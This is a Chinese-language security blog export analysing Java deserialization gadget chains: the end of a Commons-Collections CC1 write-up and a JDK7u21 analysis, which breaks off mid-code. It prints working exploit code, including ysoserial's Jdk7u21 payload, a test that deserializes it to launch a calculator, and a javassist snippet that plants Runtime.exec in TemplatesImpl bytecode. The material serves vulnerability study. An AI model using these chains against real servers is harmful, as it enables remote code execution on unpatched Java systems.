<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> DBTable &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;<span class="comment">//default是默认值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它会被这样使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DBTable</span>(name = <span class="string">"MEMBER"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Member</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于赋值的时候总是用 <code>注解元素 = 值</code>的形式太麻烦了，出现了 <code>value</code> 这个偷懒的语法糖。（这也是为什么之前的<code>@Target(ElementType.TYPE)</code>不是<code>注解元素 = 值</code>的形式）</p>
<p>如果注解元素为<strong>value</strong>时，就不需要用<code>注解元素 = 值</code>的形式，而是直接写入值就可以赋值为value。</p>
<p>除此之外java还有一些内置注解：</p>
<ul>
<li>@Override：用于标明此方法覆盖了父类的方法</li>
<li>@Deprecated：用于标明已经过时的方法或类</li>
<li>@SuppressWarnnings:用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告</li>
</ul>
<p>回过头来看看<code>java.lang.annotation.Target</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span><span class="comment">//会被写入javadoc文档</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)<span class="comment">//生命周期时运行时</span></span><br><span class="line"><span class="meta">@Target</span>(ElementType.ANNOTATION_TYPE)<span class="comment">//标明注解可以用于注解声明(应用于另一个注解上)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();<span class="comment">//注解元素，一个特定的value语法糖，可以省点力气</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初步了解了java的注解之后，我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理，不过多的去纠结内部细节，var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914105649446.png" alt="image-20200914105649446"></p>
<p>var3就是一个注解元素的键值对value这个注解元素，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914105816178.png" alt="image-20200914105816178"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//后半部分代码</span></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//&#123;value：ElementType的键值对&#125;</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        <span class="comment">//获取我们构造map的迭代器，无法命令执行的键值对是&#123;key:value&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//获取到&#123;key:value&#125;</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取键值对的键名key</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">            <span class="comment">//于是var7为空,进不到命令执行</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//触发命令执行处</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们就搞懂了为什么赋值map{key：value}就不行，因为通过AnnotationInvocationHandler#readObject，我们需要保证：</p>
<ul>
<li>我们poc中提供的<code>this.type</code>的注解要存在注解元素名（为了满足var3不为空）。</li>
<li>我们poc中提供的<code>this.memberValues</code>中存在的一个键值对的键名与<code>this.type</code>的注解要存在注解元素名相等。（为了满足var7!=null）</li>
</ul>
<p>所以我们选取了@Target注解作为<code>this.type</code>，我们就必须向<code>this.memberValues</code>写入一个<code>value：xxx</code>的键值对</p>
<p>这里的<code>this.type</code>是可以变动的，比如换成另一个元注释<code>Retention.class</code>（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是<strong>选用大家都有的元注释</strong>。</p>
<p>同时我们写入的<code>this.memberValues</code>的键名不能改变，但是值可以改变。</p>
<p>例如<code>innerMap.put(&quot;value&quot;,&quot;hello&quot;)</code>，也是可以的。</p>
<h2 id="限制点"><a href="#限制点" class="headerlink" title="限制点"></a>限制点</h2><p>8u71之前都是可以使用的，在Java 8u71之后代码发生了变动。</p>
<p>看一下jdk8里面的<code>sun.reflect.annotation.AnnotationInvocationHandler</code> readObject复写点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        Map var4 = (Map)var2.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = <span class="keyword">null</span>;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//很伤心的，没有了map赋值语句</span></span><br><span class="line">                    var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">"["</span> + var11 + <span class="string">"]"</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这个函数出现了变动，不再有针对构造的map的赋值语句，所以触发不了漏洞。</p>
<p>而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。有空之后补上。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>那么整个cc1链就分析结束了，从PoC角度进行一下步骤总结：</p>
<ol>
<li><p>首先<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>函数会将payload读取，在经过函数内部一系列的var变量解析之后，会在构造好的Map数据结构中直接setValue赋值操作。</p>
</li>
<li><p>setValue函数是<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code>；</p>
<p>它内部有一个transform危险函数，这个函数会循环解析payload封装好的transformer数组。</p>
<p>这个transformer数组是<code>org.apache.commons.collections.functors.ChainedTransformer#iTransformers</code>；</p>
<p>可以看到是经过<code>ChainedTransformer</code>数据结构封装好的</p>
</li>
<li><p>在构造map对象的时候，我们通过decorate函数<code>org.apache.commons.collections.map.TransformedMap#decorate</code>，将我们的transformer数组，也就是恶意转换链配置好，一旦出现map赋值操作，他就会自动解析我们的恶意转换链，触发漏洞。</p>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener">1</a></p>
<p><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">2</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>【反序列化漏洞】JDK7u21</title>
    <url>/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91JDK7u21/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>往事依稀浑似梦，都随风雨到心头。</p>
</blockquote>
<p>终于开学了，疯狂更博启动。</p>
<a id="more"></a>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>JDK–JRE</p>
<p>​        -tools:javac,…</p>
<p>​        -lib</p>
<p>​        -cmd:jar</p>
<p>查看系统已安装的Java版本和路径：<code>/usr/libexec/java_home -V</code></p>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">Java se 7的所有版本</a></p>
<p>存在缺陷版本：JRE -V &lt;= 7u21</p>
<p>需要<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>的搭配</p>
<h1 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ysoserial.payloads.Jdk7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: 7u21</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: 0range</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-09-07 16:02</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDK7u21Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object calc = <span class="keyword">new</span> Jdk7u21().getObject(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">            Object o = objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908103017752.png" alt="image-20200908103017752"></p>
<p>跟进看ysoserial部分的payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has</span></span><br><span class="line"><span class="comment">the same JRE version requirements.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See: https://gist.github.com/frohoff/24af7913611f8406eaf3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Call tree:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">LinkedHashSet.readObject()</span></span><br><span class="line"><span class="comment">  LinkedHashSet.add()</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">      TemplatesImpl.hashCode() (X)</span></span><br><span class="line"><span class="comment">  LinkedHashSet.add()</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">      Proxy(Templates).hashCode() (X)</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.invoke() (X)</span></span><br><span class="line"><span class="comment">          AnnotationInvocationHandler.hashCodeImpl() (X)</span></span><br><span class="line"><span class="comment">            String.hashCode() (0)</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler.memberValueHashCode() (X)</span></span><br><span class="line"><span class="comment">              TemplatesImpl.hashCode() (X)</span></span><br><span class="line"><span class="comment">      Proxy(Templates).equals()</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">          AnnotationInvocationHandler.equalsImpl()</span></span><br><span class="line"><span class="comment">            Method.invoke()</span></span><br><span class="line"><span class="comment">              ...</span></span><br><span class="line"><span class="comment">                TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment">                  TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">                    TemplatesImpl.getTransletInstance()</span></span><br><span class="line"><span class="comment">                      TemplatesImpl.defineTransletClasses()</span></span><br><span class="line"><span class="comment">                        ClassLoader.defineClass()</span></span><br><span class="line"><span class="comment">                        Class.newInstance()</span></span><br><span class="line"><span class="comment">                          ...</span></span><br><span class="line"><span class="comment">                            MaliciousClass.&lt;clinit&gt;()</span></span><br><span class="line"><span class="comment">                              ...</span></span><br><span class="line"><span class="comment">                                Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">"isApplicableJavaVersion"</span>)</span><br><span class="line"><span class="meta">@Dependencies</span>()</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.FROHOFF &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jdk7u21</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"></span><br><span class="line">		HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">		map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">		Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">		LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">		set.add(templates);</span><br><span class="line">		set.add(proxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">"_auxClasses"</span>, <span class="keyword">null</span>);</span><br><span class="line">		Reflections.setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">		map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> set;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    JavaVersion v = JavaVersion.getLocalVersion();</span><br><span class="line">	    <span class="keyword">return</span> v != <span class="keyword">null</span> &amp;&amp; (v.major &lt; <span class="number">7</span> || (v.major == <span class="number">7</span> &amp;&amp; v.update &lt;= <span class="number">21</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		PayloadRunner.run(Jdk7u21<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么是“f5a5a608”这个字符串，因为<code>hashcode（）</code>方法计算结果为<code>0</code>；这个之后会用到。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = hash;</span><br><span class="line">        <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> off = offset;</span><br><span class="line">            <span class="keyword">char</span> val[] = value;</span><br><span class="line">            <span class="keyword">int</span> len = count;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                h = <span class="number">31</span>*h + val[off++];</span><br><span class="line">            &#125;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="1-createTemplatesImpl"><a href="#1-createTemplatesImpl" class="headerlink" title="1-createTemplatesImpl"></a>1-createTemplatesImpl</h2><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908104222689.png" alt="image-20200908104222689"></p>
<p>继续跟 能看到：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908104721460.png" alt="image-20200908104721460"></p>
<p>在利用 payload 中，TemplatesImpl 类主要的作用为：</p>
<ul>
<li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意class =&gt; byte array )</li>
<li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li>
</ul>
<p>来具体看一下，该类位于 <code>com.sun.org.apache.xalan.internal.xsltc.trax</code> 包中，用于 xml document 的处理和转换，定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure>



<p><code>TemplatesImpl</code> 类实现了 <code>Templates</code> 和 <code>Serializable</code> 两个接口</p>
<p>其中 <code>Templates</code> 接口定义如下，包含了两个方法，<strong>即之前提到触发恶意代码执行所的方法</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="function">Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span>;</span><br><span class="line">    <span class="function">Properties <span class="title">getOutputProperties</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>TemplatesImpl</code> 类中有一个 private 方法 <code>defineTransletClasses()</code>，精简后的代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = <span class="keyword">null</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        TransletClassLoader loader = ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">// 调用 ClassLoader.defineClass() 方法加载 Class </span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要理解的是：</p>
<p>在方法中，调用了 <code>ClassLoader.defineClass()</code> 方法，参数为实例变量 <code>_bytecodes</code> 内的元素，该方法会将字节数组转换为 Class，并加载</p>
<p>也就是说，<strong>通过设置 <code>_bytecodes</code> 的内容 ，调用 <code>defineTransletClasses()</code> 方法即可加载指定的 Class</strong>。</p>
<p>find usages：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909150305919.png" alt="image-20200909150305919"></p>
<p>一共三处：</p>
<ul>
<li>getTransletClasses()</li>
<li>getTransletIndex()</li>
<li>getTransletInstance()</li>
</ul>
<p>这里满足条件的就是第三个函数<code>getTransletInstance()</code></p>
<p>跟进去看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// 创建实例</span></span><br><span class="line">         AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">         ...</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>defineTransletClasses()</code> 执行后，会调用之前加载的 Class 的 <code>newInstance()</code> 方法来创建实例，触发 static block 和 constructor 的执行，根据方法，调用关系如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties() =&gt; newTransformer() =&gt; getTransletInstance() =&gt; defineTransletClasses() =&gt; ClassLoader.defineClass()</span><br></pre></td></tr></table></figure>

<p>可以看到调用 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 方法均可触发恶意代码的执行。</p>
<p>理一下思路</p>
<ul>
<li>使用 <code>javassist</code> 库创建一个包含恶意代码的 class，恶意代码可以在 static block中，或在无参构造函数里</li>
<li>将恶意 class 的的字节码添加到 TemplatesImpl 实例的 <code>_bytecodes</code> 变量中</li>
<li>调用实例的 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 方法触发恶意代码执行</li>
</ul>
<p>弹出计算器的代码示例如下 (程序报错可以忽略)：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.get(Cat<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a /Applications/Calculator.app\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入恶意代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">// 使用构造方法也可以</span></span><br><span class="line">        <span class="comment">//CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]&#123;&#125;);</span></span><br><span class="line">        <span class="comment">//constructor.insertBefore(cmd);</span></span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">// 为了使 _transletIndex 正确，并执行 newInstance()，具体可查看 defineTransletClasses 方法</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilByteCodes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;evilByteCodes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span> + System.nanoTime());</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        